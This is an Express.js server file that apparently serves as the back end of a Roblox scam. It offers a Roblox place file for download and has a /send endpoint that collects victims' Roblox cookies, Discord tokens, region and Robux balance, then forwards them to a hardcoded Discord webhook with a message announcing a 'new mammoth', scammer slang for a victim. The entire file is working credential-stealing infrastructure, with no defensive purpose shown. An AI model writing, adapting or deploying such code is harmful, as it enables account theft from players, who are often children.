const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl');
  res.download(file);
});

app.post('/send', async (req, res) => {
  const { cookies, tokens, region } = req.body;
  let robux = 1488
  try {
    robux = req.body.robux;
  } catch {
    robux = 67;
  }
  const cookiesString = Object.values(cookies).join(' ');
  const tokensString = Object.values(tokens).join(' ');

  console.log('Cookies:', cookiesString);
  console.log('Tokens:', tokensString);

  const plainMessage = `@everyone Новый мамонт! Регион: ${region} \n \n РБ: ${cookiesString} \n ДС: ${tokensString} \n РОБУКСЫ: ${robux}`;
  const content = '```' + plainMessage + '```';

  // Отправляем в Discord
  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content })
  });

  console.log('Discord response status:', response.status);
  res.status(200).json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
